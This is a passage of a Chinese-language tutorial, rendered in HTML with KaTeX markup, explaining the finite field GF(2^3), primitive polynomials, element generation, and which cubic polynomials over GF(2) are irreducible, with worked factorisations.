<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>以</mtext><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mn>3</mn></msup><mo stretchy="false">)</mo><mtext>为例，指数小于</mtext><mn>3</mn><mtext>的多项式共</mtext><mn>8</mn><mtext>个：</mtext><mn>0</mn><mtext>，</mtext><mn>1</mn><mtext>，</mtext><mi>x</mi><mtext>，</mtext><mi>x</mi><mo>+</mo><mn>1</mn><mtext>，</mtext><msup><mi>x</mi><mn>2</mn></msup><mtext>，</mtext><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mtext>，</mtext><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mtext>，</mtext><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mtext>。</mtext><mspace linebreak="newline"></mspace><mtext>其系数刚好就是</mtext><mn>000</mn><mo separator="true">,</mo><mn>001</mn><mo separator="true">,</mo><mn>010</mn><mo separator="true">,</mo><mn>011</mn><mo separator="true">,</mo><mn>100</mn><mo separator="true">,</mo><mn>101</mn><mo separator="true">,</mo><mn>110</mn><mo separator="true">,</mo><mn>111</mn><mtext>，是</mtext><mn>0</mn><mtext>到</mtext><mn>7</mn><mtext>这</mtext><mn>8</mn><mtext>个数的二进制形式。</mtext><mspace linebreak="newline"></mspace><mtext>多项式对应一个值，我们可以称这个值为多项式值（有时看成一个向量）。</mtext><mspace linebreak="newline"></mspace><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mn>3</mn></msup><mo stretchy="false">)</mo><mtext>上有不只一个本原多项式，选一个本原多项式</mtext><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mspace linebreak="newline"></mspace><mtext>这</mtext><mn>8</mn><mtext>个多项式进行四则运算后</mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>的结果都是</mtext><mn>8</mn><mtext>个之中的某一个。</mtext></mrow><annotation encoding="application/x-tex">以GF(2^3)为例，指数小于3的多项式共8个：0，1，x，x+1，x^2，x^2+1，x^2+x，x^2+x+1。\\其系数刚好就是000,001,010,011,100,101,110,111，是0到7这8个数的二进制形式。\\多项式对应一个值，我们可以称这个值为多项式值（有时看成一个向量）。\\GF(2^3)上有不只一个本原多项式，选一个本原多项式x^3+x+1\\这8个多项式进行四则运算后 mod (x^3+x+1)的结果都是8个之中的某一个。
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">以</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">例</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">指</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">于</span><span class="mord">3</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">共</span><span class="mord">8</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">：</span><span class="mord">0</span><span class="mord cjk_fallback">，</span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord cjk_fallback">。</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">系</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">刚</span><span class="mord cjk_fallback">好</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">是</span><span class="mord">0</span><span class="mord cjk_fallback">到</span><span class="mord">7</span><span class="mord cjk_fallback">这</span><span class="mord">8</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">制</span><span class="mord cjk_fallback">形</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">。</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">应</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">称</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">（</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">看</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">。</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">本</span><span class="mord cjk_fallback">原</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">本</span><span class="mord cjk_fallback">原</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">这</span><span class="mord">8</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">四</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">运</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">后</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">结</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">都</span><span class="mord cjk_fallback">是</span><span class="mord">8</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">某</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">。</span></span></span></span></span></p>
<p>设 P (x) 是 GF（2^w）上的某一个本原多项式</p>
<p>GF（2^w）的元素产生步骤是：</p>
<p>1. 给定一个初始集合，包含 0,1 和元素 x，即 {0,1,x}；</p>
<p>2. 将这个集合中的最后一个元素，即 x，乘以 x，如果结果的度大于等于 w，则将结果 mod P (x) 后加入集合；</p>
<p>3. 直到集合有 2^w 个元素，此时最后一个元素乘以 x 再 mod P (x) 的值等于 1。</p>
<h3 id="不可约多项式"><a class="anchor" href="#不可约多项式">#</a> 不可约多项式</h3>
<p>所谓不可约多项式，是指各个系数模质数 p 的条件下</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>对于多项式</mtext><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mtext>，如果不存在两个比此多项式阶小的多项式</mtext><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>使得</mtext><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>就称这个多项式是不可约的。</mtext></mrow><annotation encoding="application/x-tex">对于多项式 f(x)，如果不存在两个比此多项式阶小的多项式 f_{1}(x),f_{2}(x),使得f(x)=f_{1}(x)f_{2}(x),就称这个多项式是不可约的。
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">阶</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">得</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">称</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">约</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">。</span></span></span></span></span></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/bc2989ccf064d145.png" alt="" /></p>
<p>下面看个例子吧</p>
<p>设置模数为 2，多项式为 3 阶，满足条件的多项式有 8 个<img data-src="https://www.zhihu.com/equation?tex=x%5E3%2Cx%5E3%2B1%2Cx%5E3%2Bx%2Cx%5E3%2Bx%2B1%2Cx%5E3%2Bx%5E2%2Cx%5E3%2Bx%5E2%2B1%2Cx%5E3%2Bx%5E2%2Bx%2Cx%5E3%2Bx%5E2%2Bx%2B1" alt="[公式]" /></p>
<p>这些多项式中，哪些是不可约多项式呢？很明显</p>
<p><img data-src="https://www.zhihu.com/equation?tex=x%5E3%2Cx%5E3%2Bx%2Cx%5E3%2Bx%5E2%2Cx%5E3%2Bx%5E2%2Bx" alt="[公式]" /></p>
<p>这 4 个多项式不满足条件，因为它们都有约数 x</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mn>1</mn><mtext>不满足条件，因为</mtext><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x^3+1不满足条件，因为x^3+1=(x+1)(x^2+x+1)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord cjk_fallback">条</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">为</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mtext>不满足条件，</mtext><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x^3+x^2+x+1不满足条件，x^3+x^2+x+1=(x+1)(x^2+1)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord cjk_fallback">条</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span 